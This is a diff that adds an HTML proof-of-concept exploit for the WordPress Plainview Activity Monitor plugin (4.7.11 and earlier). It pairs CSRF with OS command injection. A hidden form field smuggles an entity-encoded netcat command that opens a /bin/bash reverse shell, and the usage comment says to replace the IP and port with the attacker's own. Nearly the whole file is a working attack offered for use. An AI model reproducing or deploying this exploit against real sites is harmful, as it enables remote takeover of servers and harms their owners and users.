@@ -1,0 +1,17 @@
+<html>
+  <!--  Wordpress Plainview Activity Monitor RCE
+        [+] Version: 4.7.11 and possibly prior
+        [+] Description: Combine OS Commanding and CSRF to get reverse shell
+        [+] Author: Lydéric LEFEBVRE
+        [+] Usage: Replace 127.0.0.1 & 9999 with you ip and port to get reverse shell
+        [+] Note: Many reflected XSS exists on this plugin can be combine with this exploit as well
+  -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="ip" value="google&#46;fr&#124;&#32;nc&#32;&#45;nlvp&#32;127.0.0.1&#32;9999&#32;&#45;e&#32;&#47;bin&#47;bash" />
+      <input type="hidden" name="lookup" value="Lookup" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
